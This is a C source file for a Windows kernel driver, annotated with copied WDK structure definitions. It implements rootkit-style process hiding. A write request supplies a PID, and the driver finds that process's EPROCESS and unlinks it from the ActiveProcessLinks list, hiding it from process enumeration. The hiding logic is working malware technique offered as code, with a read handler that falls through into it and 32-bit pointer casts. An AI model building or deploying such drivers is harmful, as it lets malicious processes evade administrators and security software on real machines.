#include <ntifs.h> // NT Interface 

/*
L"" unicode string

UNICODE_STRING RTL_CONSTANT_STRING(
  [in]  PCWSTR SourceString
);

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING;

*/
UNICODE_STRING DeviceName=RTL_CONSTANT_STRING(L"\\Device\\zwhawk");
UNICODE_STRING SymbolicLink=RTL_CONSTANT_STRING(L"\\DosDevices\\zwhawk");

/*
driver handles I/O requests
typedef struct _DEVICE_OBJECT {
  CSHORT                      Type;
  USHORT                      Size; // Specifies the size, in bytes, of the device object.
  LONG                        ReferenceCount; // Track the number of open handles for the device 
  struct _DRIVER_OBJECT  *DriverObject; // A pointer to the driver object (DRIVER_OBJECT), that represents the 
										// loaded image of the driver that was input to the DriverEntry and AddDevice routines.
  struct _DEVICE_OBJECT  *NextDevice; // A pointer to the next device object, if any, that was created by the same driver. 
									  // The I/O manager updates this list at each successful call to IoCreateDevice or IoCreateDeviceSecure.
  struct _DEVICE_OBJECT  *AttachedDevice;
  struct _IRP  *CurrentIrp; // A pointer to the current IRP 
  PIO_TIMER                   Timer;
  ULONG                       Flags;
  ULONG                       Characteristics;
  __volatile PVPB             Vpb;
  PVOID                       DeviceExtension;
  DEVICE_TYPE                 DeviceType;
  CCHAR                       StackSize;
  union {
    LIST_ENTRY         ListEntry;
    WAIT_CONTEXT_BLOCK Wcb;
  } Queue;
  ULONG                       AlignmentRequirement;
  KDEVICE_QUEUE               DeviceQueue;
  KDPC                        Dpc;
  ULONG                       ActiveThreadCount;
  PSECURITY_DESCRIPTOR        SecurityDescriptor;
  KEVENT                      DeviceLock;
  USHORT                      SectorSize;
  USHORT                      Spare1;
  struct _DEVOBJ_EXTENSION  *  DeviceObjectExtension;
  PVOID                       Reserved;
} DEVICE_OBJECT, *PDEVICE_OBJECT;


typedef struct _DRIVER_OBJECT {
  PDEVICE_OBJECT     DeviceObject; // Pointer to the device objects created by the driver. 
  PDRIVER_EXTENSION  DriverExtension;
  PUNICODE_STRING    HardwareDatabase; // Pointer to the \Registry\Machine\Hardware path to the hardware 
									   //configuration information in the registry.
  PFAST_IO_DISPATCH  FastIoDispatch;
  PDRIVER_INITIALIZE DriverInit; // The entry point for the DriverEntry routine, which is set up by the I/O manager.
  PDRIVER_STARTIO    DriverStartIo;
  PDRIVER_UNLOAD     DriverUnload; // The entry point for the driver's Unload routine
  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION+1]; // A dispatch table consisting of an array
															   //of entry points for the driver's DispatchXxx routines.
} DRIVER_OBJECT, *PDRIVER_OBJECT;

DRIVER_INITIALIZE DriverEntry;

NTSTATUS DriverEntry(
  _In_ struct _DRIVER_OBJECT *DriverObject,
  _In_ PUNICODE_STRING       RegistryPath // A pointer to a counted Unicode string specifying the path to the driver's registry key.
										  // \Registry\Machine\System\CurrentControlSet\Services\DriverName
)
*/
PDEVICE_OBJECT pDeviceObject;

// Driver Unload
void Unload(PDRIVER_OBJECT pDriverObject)
{
	/*
	NTSTATUS IoDeleteSymbolicLink(
		_In_ PUNICODE_STRING SymbolicLinkName
	);
	*/
    IoDeleteSymbolicLink(&SymbolicLink);

	/*
	VOID IoDeleteDevice(
		_In_ PDEVICE_OBJECT DeviceObject
	);
	*/
    IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject,PIRP irp)
{
    PIO_STACK_LOCATION io;
    PVOID buffer;
    PEPROCESS Process;
 
    PULONG ptr;
    PLIST_ENTRY PrevListEntry,CurrListEntry,NextListEntry;
 
    NTSTATUS status;
    ULONG i,offset;
	/*
	  PMDL            MdlAddress; // Pointer to an MDL describing a user buffer
	  ULONG           Flags;
	  union {
		struct _IRP  *MasterIrp;
		PVOID       SystemBuffer;
	  } AssociatedIrp;
	  IO_STATUS_BLOCK IoStatus; // Contains the IO_STATUS_BLOCK structure
	  KPROCESSOR_MODE RequestorMode;
	  BOOLEAN         PendingReturned;
	  BOOLEAN         Cancel;
	  KIRQL           CancelIrql;
	  PDRIVER_CANCEL  CancelRoutine;
	  PVOID           UserBuffer;
	  union {
		struct {
		  union {
			KDEVICE_QUEUE_ENTRY DeviceQueueEntry;
			struct {
			  PVOID DriverContext[4];
			};
		  };
		  PETHREAD   Thread;
		  LIST_ENTRY ListEntry;
		} Overlay;
	  } Tail;
	} IRP, *PIRP;
	
	typedef struct _IO_STATUS_BLOCK {
	  union {
		NTSTATUS Status;
		PVOID    Pointer;
	  };
	  ULONG_PTR Information;
	} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

	PIO_STACK_LOCATION IoGetCurrentIrpStackLocation(
	  _In_ PIRP Irp
	);

	typedef struct _IO_STACK_LOCATION { // Structure that contains the I/O stack location for the driver.
	  UCHAR                  MajorFunction; // Tells the driver what operation 
											// it or the underlying device driver should carry out to satisfy the I/O request.
											// IRP Major Function Codes
	  UCHAR                  MinorFunction;
	  UCHAR                  Flags;
	  UCHAR                  Control;
	  union {
		struct {
		  PIO_SECURITY_CONTEXT      SecurityContext;
		  ULONG                     Options;
		  USHORT POINTER_ALIGNMENT  FileAttributes;
		  USHORT                    ShareAccess;
		  ULONG POINTER_ALIGNMENT   EaLength;
		} Create;
		struct {
		  PIO_SECURITY_CONTEXT          SecurityContext;
		  ULONG                         Options;
		  USHORT POINTER_ALIGNMENT      Reserved;
		  USHORT                        ShareAccess;
		  PNAMED_PIPE_CREATE_PARAMETERS Parameters;
		} CreatePipe;
		struct {
		  PIO_SECURITY_CONTEXT        SecurityContext;
		  ULONG                       Options;
		  USHORT POINTER_ALIGNMENT    Reserved;
		  USHORT                      ShareAccess;
		  PMAILSLOT_CREATE_PARAMETERS Parameters;
		} CreateMailslot;
		struct {
		  ULONG                   Length;
		  ULONG POINTER_ALIGNMENT Key;
		  LARGE_INTEGER           ByteOffset;
		} Read;
		struct {
		  ULONG                   Length;
		  ULONG POINTER_ALIGNMENT Key;
		  LARGE_INTEGER           ByteOffset;
		} Write;
		struct {
		  ULONG                   Length;
		  PUNICODE_STRING         FileName;
		  FILE_INFORMATION_CLASS  FileInformationClass;
		  ULONG POINTER_ALIGNMENT FileIndex;
		} QueryDirectory;
		struct {
		  ULONG                   Length;
		  ULONG POINTER_ALIGNMENT CompletionFilter;
		} NotifyDirectory;
		struct {
		  ULONG                                    Length;
		  FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
		} QueryFile;
		struct {
		  ULONG                                    Length;
		  FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;
		  PFILE_OBJECT                             FileObject;
		  union {
			struct {
			  BOOLEAN ReplaceIfExists;
			  BOOLEAN AdvanceOnly;
			};
			ULONG  ClusterCount;
			HANDLE DeleteHandle;
		  };
		} SetFile;
		struct {
		  ULONG                   Length;
		  PVOID                   EaList;
		  ULONG                   EaListLength;
		  ULONG POINTER_ALIGNMENT EaIndex;
		} QueryEa;
		struct {
		  ULONG Length;
		} SetEa;
		struct {
		  ULONG                                  Length;
		  FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
		} QueryVolume;
		struct {
		  ULONG                                  Length;
		  FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;
		} SetVolume;
		struct {
		  ULONG                   OutputBufferLength;
		  ULONG POINTER_ALIGNMENT InputBufferLength;
		  ULONG POINTER_ALIGNMENT FsControlCode;
		  PVOID                   Type3InputBuffer;
		} FileSystemControl;
		struct {
		  PLARGE_INTEGER          Length;
		  ULONG POINTER_ALIGNMENT Key;
		  LARGE_INTEGER           ByteOffset;
		} LockControl;
		struct {
		  ULONG                   OutputBufferLength;
		  ULONG POINTER_ALIGNMENT InputBufferLength;
		  ULONG POINTER_ALIGNMENT IoControlCode;
		  PVOID                   Type3InputBuffer;
		} DeviceIoControl;
		struct {
		  SECURITY_INFORMATION    SecurityInformation;
		  ULONG POINTER_ALIGNMENT Length;
		} QuerySecurity;
		struct {
		  SECURITY_INFORMATION SecurityInformation;
		  PSECURITY_DESCRIPTOR SecurityDescriptor;
		} SetSecurity;
		struct {
		  PVPB           Vpb;
		  PDEVICE_OBJECT DeviceObject;
		} MountVolume;
		struct {
		  PVPB           Vpb;
		  PDEVICE_OBJECT DeviceObject;
		} VerifyVolume;
		struct {
		  struct _SCSI_REQUEST_BLOCK  *Srb;
		} Scsi;
		struct {
		  ULONG                       Length;
		  PSID                        StartSid;
		  PFILE_GET_QUOTA_INFORMATION SidList;
		  ULONG                       SidListLength;
		} QueryQuota;
		struct {
		  ULONG Length;
		} SetQuota;
		struct {
		  DEVICE_RELATION_TYPE Type;
		} QueryDeviceRelations;
		struct {
		  const GUID *InterfaceType;
		  USHORT     Size;
		  USHORT     Version;
		  PINTERFACE Interface;
		  PVOID      InterfaceSpecificData;
		} QueryInterface;
		struct {
		  PDEVICE_CAPABILITIES Capabilities;
		} DeviceCapabilities;
		struct {
		  PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList;
		} FilterResourceRequirements;
		struct {
		  ULONG                   WhichSpace;
		  PVOID                   Buffer;
		  ULONG                   Offset;
		  ULONG POINTER_ALIGNMENT Length;
		} ReadWriteConfig;
		struct {
		  BOOLEAN Lock;
		} SetLock;
		struct {
		  BUS_QUERY_ID_TYPE IdType;
		} QueryId;
		struct {
		  DEVICE_TEXT_TYPE       DeviceTextType;
		  LCID POINTER_ALIGNMENT LocaleId;
		} QueryDeviceText;
		struct {
		  BOOLEAN                                          InPath;
		  BOOLEAN                                          Reserved[3];
		  DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type;
		} UsageNotification;
		struct {
		  SYSTEM_POWER_STATE PowerState;
		} WaitWake;
		struct {
		  PPOWER_SEQUENCE PowerSequence;
		} PowerSequence;
	#if (NTDDI_VERSION >= NTDDI_VISTA)
		struct {
		  union {
			ULONG                      SystemContext;
			SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext;
		  };
		  POWER_STATE_TYPE POINTER_ALIGNMENT Type;
		  POWER_STATE POINTER_ALIGNMENT      State;
		  POWER_ACTION POINTER_ALIGNMENT     ShutdownType;
		} Power;
	#else 
		struct {
		  ULONG                              SystemContext;
		  POWER_STATE_TYPE POINTER_ALIGNMENT Type;
		  POWER_STATE POINTER_ALIGNMENT      State;
		  POWER_ACTION POINTER_ALIGNMENT     ShutdownType;
		} Power;
	#endif 
		struct {
		  PCM_RESOURCE_LIST AllocatedResources;
		  PCM_RESOURCE_LIST AllocatedResourcesTranslated;
		} StartDevice;
		struct {
		  ULONG_PTR ProviderId;
		  PVOID     DataPath;
		  ULONG     BufferSize;
		  PVOID     Buffer;
		} WMI;
		struct {
		  PVOID Argument1;
		  PVOID Argument2;
		  PVOID Argument3;
		  PVOID Argument4;
		} Others;
	  } Parameters;
	  PDEVICE_OBJECT         DeviceObject;
	  PFILE_OBJECT           FileObject;
	  PIO_COMPLETION_ROUTINE CompletionRoutine;
	  PVOID                  Context;
	} IO_STACK_LOCATION, *PIO_STACK_LOCATION;
	*/
    io=IoGetCurrentIrpStackLocation(irp);

	/*
	This is set to a request-dependent value. For example, on successful completion of a transfer request, 
	this is set to the number of bytes transferred.
	If a transfer request is completed with another STATUS_XXX, this member is set to zero.
	*/
    irp->IoStatus.Information=0;
    offset=0;
 
    switch(io->MajorFunction)
    {
        case IRP_MJ_CREATE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_CLOSE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_READ:
            status=STATUS_SUCCESS;
        case IRP_MJ_WRITE:
			/*
			// Returns the base system-space virtual address that maps the physical pages that 
			// the specified MDL describes. If the pages are not already mapped to 
			// system address space and the attempt to map them fails, NULL is returned.
			PVOID MmGetSystemAddressForMdlSafe(
			  [in] PMDL             Mdl, // Pointer to a buffer whose corresponding base virtual address is to be mapped.
			  [in] MM_PAGE_PRIORITY Priority // Specifies an MM_PAGE_PRIORITY 
			);

			IRP_MJ_WRITE
				The MDL describes a buffer that contains data for the device or driver.
			*/
			
			// Buffer from user space
            buffer=MmGetSystemAddressForMdlSafe(irp->MdlAddress,NormalPagePriority);
			
			// Failed mapping pages to system address space 
            if(!buffer)
            {
                status=STATUS_INSUFFICIENT_RESOURCES; // 0xC000009A
                break;
            }
 
			/*
			typedef HANDLE *PHANDLE;
			
			typedef PVOID HANDLE;

			typedef void *PVOID;
			*/
            DbgPrint("Process ID: %d",*(PHANDLE)buffer);
			
			/*
				NTSTATUS PsLookupProcessByProcessId(
				  _In_  HANDLE    ProcessId, // Specifies the process ID of the process.
				  _Out_ PEPROCESS *Process // Returns a referenced pointer to the 
										   // EPROCESS structure of process specified by ProcessId.
				);

				typedef struct _EPROCESS
				{
					 KPROCESS Pcb;
					 EX_PUSH_LOCK ProcessLock;
					 LARGE_INTEGER CreateTime;
					 LARGE_INTEGER ExitTime;
					 EX_RUNDOWN_REF RundownProtect;
					 PVOID UniqueProcessId;	// Process Identifier (PID)
					 LIST_ENTRY ActiveProcessLinks; // Process Linked List
					 ULONG QuotaUsage[3];
					 ULONG QuotaPeak[3];
					 ULONG CommitCharge;
					 ULONG PeakVirtualSize;
					 ULONG VirtualSize;
					 LIST_ENTRY SessionProcessLinks;
					 PVOID DebugPort;
					 union
					 {
						  PVOID ExceptionPortData;
						  ULONG ExceptionPortValue;
						  ULONG ExceptionPortState: 3;
					 };
					 PHANDLE_TABLE ObjectTable;
					 EX_FAST_REF Token;
					 ULONG WorkingSetPage;
					 EX_PUSH_LOCK AddressCreationLock;
					 PETHREAD RotateInProgress;
					 PETHREAD ForkInProgress;
					 ULONG HardwareTrigger;
					 PMM_AVL_TABLE PhysicalVadRoot;
					 PVOID CloneRoot;
					 ULONG NumberOfPrivatePages;
					 ULONG NumberOfLockedPages;
					 PVOID Win32Process;
					 PEJOB Job;
					 PVOID SectionObject;
					 PVOID SectionBaseAddress;
					 _EPROCESS_QUOTA_BLOCK * QuotaBlock;
					 _PAGEFAULT_HISTORY * WorkingSetWatch;
					 PVOID Win32WindowStation;
					 PVOID InheritedFromUniqueProcessId;
					 PVOID LdtInformation;
					 PVOID VadFreeHint;
					 PVOID VdmObjects;
					 PVOID DeviceMap;
					 PVOID EtwDataSource;
					 PVOID FreeTebHint;
					 union
					 {
						  HARDWARE_PTE PageDirectoryPte;
						  UINT64 Filler;
					 };
					 PVOID Session;
					 UCHAR ImageFileName[16];
					 LIST_ENTRY JobLinks;
					 PVOID LockedPagesList;
					 LIST_ENTRY ThreadListHead;
					 PVOID SecurityPort;
					 PVOID PaeTop;
					 ULONG ActiveThreads;
					 ULONG ImagePathHash;
					 ULONG DefaultHardErrorProcessing;
					 LONG LastThreadExitStatus;
					 PPEB Peb;
					 EX_FAST_REF PrefetchTrace;
					 LARGE_INTEGER ReadOperationCount;
					 LARGE_INTEGER WriteOperationCount;
					 LARGE_INTEGER OtherOperationCount;
					 LARGE_INTEGER ReadTransferCount;
					 LARGE_INTEGER WriteTransferCount;
					 LARGE_INTEGER OtherTransferCount;
					 ULONG CommitChargeLimit;
					 ULONG CommitChargePeak;
					 PVOID AweInfo;
					 SE_AUDIT_PROCESS_CREATION_INFO SeAuditProcessCreationInfo;
					 MMSUPPORT Vm;
					 LIST_ENTRY MmProcessLinks;
					 ULONG ModifiedPageCount;
					 ULONG Flags2;
					 ULONG JobNotReallyActive: 1;
					 ULONG AccountingFolded: 1;
					 ULONG NewProcessReported: 1;
					 ULONG ExitProcessReported: 1;
					 ULONG ReportCommitChanges: 1;
					 ULONG LastReportMemory: 1;
					 ULONG ReportPhysicalPageChanges: 1;
					 ULONG HandleTableRundown: 1;
					 ULONG NeedsHandleRundown: 1;
					 ULONG RefTraceEnabled: 1;
					 ULONG NumaAware: 1;
					 ULONG ProtectedProcess: 1;
					 ULONG DefaultPagePriority: 3;
					 ULONG PrimaryTokenFrozen: 1;
					 ULONG ProcessVerifierTarget: 1;
					 ULONG StackRandomizationDisabled: 1;
					 ULONG Flags;
					 ULONG CreateReported: 1;
					 ULONG NoDebugInherit: 1;
					 ULONG ProcessExiting: 1;
					 ULONG ProcessDelete: 1;
					 ULONG Wow64SplitPages: 1;
					 ULONG VmDeleted: 1;
					 ULONG OutswapEnabled: 1;
					 ULONG Outswapped: 1;
					 ULONG ForkFailed: 1;
					 ULONG Wow64VaSpace4Gb: 1;
					 ULONG AddressSpaceInitialized: 2;
					 ULONG SetTimerResolution: 1;
					 ULONG BreakOnTermination: 1;
					 ULONG DeprioritizeViews: 1;
					 ULONG WriteWatch: 1;
					 ULONG ProcessInSession: 1;
					 ULONG OverrideAddressSpace: 1;
					 ULONG HasAddressSpace: 1;
					 ULONG LaunchPrefetched: 1;
					 ULONG InjectInpageErrors: 1;
					 ULONG VmTopDown: 1;
					 ULONG ImageNotifyDone: 1;
					 ULONG PdeUpdateNeeded: 1;
					 ULONG VdmAllowed: 1;
					 ULONG SmapAllowed: 1;
					 ULONG ProcessInserted: 1;
					 ULONG DefaultIoPriority: 3;
					 ULONG SparePsFlags1: 2;
					 LONG ExitStatus;
					 WORD Spare7;
					 union
					 {
						  struct
						  {
							   UCHAR SubSystemMinorVersion;
							   UCHAR SubSystemMajorVersion;
						  };
						  WORD SubSystemVersion;
					 };
					 UCHAR PriorityClass;
					 MM_AVL_TABLE VadRoot;
					 ULONG Cookie;
					 ALPC_PROCESS_CONTEXT AlpcContext;
				} EPROCESS, *PEPROCESS;
			*/
            if(!NT_SUCCESS(status=PsLookupProcessByProcessId(*(PHANDLE)buffer,&Process)))
            {
                DbgPrint("Error: Unable to open process object (%#x)",status);
                break;
            }
 
            DbgPrint("EPROCESS address: %#x",Process);
            ptr=(PULONG)Process;
 
            // Scan the EPROCESS structure for ActiveProcessLinks ( Element after UniqueProcessId )
 
            for(i=0;i<512;i++)
            {
                if(ptr[i]==*(PULONG)buffer)
                {
					// Get offset of ActiveProcessLinks from the beginning of EPROCESS structure
                    offset=(ULONG)&ptr[i+1]-(ULONG)Process; // ActiveProcessLinks is located next to the PID
 
                    DbgPrint("ActiveProcessLinks offset: %#x",offset);
                    break;
                }
            }
 
            if(!offset)
            {
                status=STATUS_UNSUCCESSFUL;
                break;
            }
			
			/*
			typedef struct _LIST_ENTRY {
			  struct _LIST_ENTRY  *Flink; // Flink member points to the next entry in the list or to
										  // the list header if there is no next entry in the list.
			  struct _LIST_ENTRY  *Blink; // Blink member points to the previous entry in the list or to
										  // the list header if there is no previous entry in the list.
			} LIST_ENTRY, *PLIST_ENTRY;

			*/
            CurrListEntry=(PLIST_ENTRY)((PUCHAR)Process+offset); // Get the ActiveProcessLinks address
 
            PrevListEntry=CurrListEntry->Blink;
            NextListEntry=CurrListEntry->Flink;
 
            // Unlink the target process from other processes
 
            PrevListEntry->Flink=CurrListEntry->Flink;
            NextListEntry->Blink=CurrListEntry->Blink;
 
            // Point Flink and Blink to self
 
            CurrListEntry->Flink=CurrListEntry;
            CurrListEntry->Blink=CurrListEntry;
			
			// ObDereferenceObject decreases the reference count of an object by one. 
            ObDereferenceObject(Process); // Dereference the target process
 
            status=STATUS_SUCCESS;

			/*
			This is set to a request-dependent value. For example, on successful completion of a transfer request, 
			this is set to the number of bytes transferred.
			If a transfer request is completed with another STATUS_XXX, this member is set to zero.
			*/
            irp->IoStatus.Information=sizeof(HANDLE);
 
            break;
 
        default:
            status=STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
 
    irp->IoStatus.Status=status;
	
	/*
	The IoCompleteRequest routine indicates that the caller has completed all 
	processing for a given I/O request and is returning the given IRP to the I/O manager.
	*/
    IoCompleteRequest(irp,IO_NO_INCREMENT);
    return status;
}
 
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
    ULONG i;
     
	/*
	The IoCreateDevice routine creates a device object for use by a driver.

	NTSTATUS IoCreateDevice(
	  _In_     PDRIVER_OBJECT  DriverObject, // Pointer to the driver object for the caller. Each driver receives a
											 // pointer to its driver object in a parameter to its DriverEntry routine. 
	  _In_     ULONG           DeviceExtensionSize, // Specifies the driver-determined number of bytes to be allocated
													// for the device extension of the device object. 
	  _In_opt_ PUNICODE_STRING DeviceName, // Optionally points to a buffer containing a null-terminated 
										   // Unicode string that names the device object. 
	  _In_     DEVICE_TYPE     DeviceType, // Specifies one of the system-defined FILE_DEVICE_XXX 
										   // constants that indicate the type of device
	  _In_     ULONG           DeviceCharacteristics, // Specifies one or more system-defined constants
	  _In_     BOOLEAN         Exclusive, // Specifies if the device object represents an exclusive device
	  _Out_    PDEVICE_OBJECT  *DeviceObject // Pointer to a variable that receives a pointer to the newly created 
											 // DEVICE_OBJECT structure. The DEVICE_OBJECT structure is 
											 // allocated from nonpaged pool.
	);
	*/
    IoCreateDevice(pDriverObject,0,&DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&pDeviceObject);

	/*
	The IoCreateSymbolicLink routine sets up a symbolic link between a device object name and a 
	user-visible name for the device.

	NTSTATUS IoCreateSymbolicLink(
	  _In_ PUNICODE_STRING SymbolicLinkName, // Pointer to a buffered Unicode string that is the user-visible name.
	  _In_ PUNICODE_STRING DeviceName // Pointer to a buffered Unicode string that is the name of the driver-created device object.
	);


	*/
    IoCreateSymbolicLink(&SymbolicLink,&DeviceName);
 
    pDriverObject->DriverUnload=Unload;
 
    for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
    {
        pDriverObject->MajorFunction[i]=DriverDispatch;
    }
	
	// Prevent other components from sending I/O to a device before the driver has
	// finished initializing the device object.
    pDeviceObject->Flags&=~DO_DEVICE_INITIALIZING;

	// Uses direct I/O
    pDeviceObject->Flags|=DO_DIRECT_IO;
 
    return STATUS_SUCCESS;
}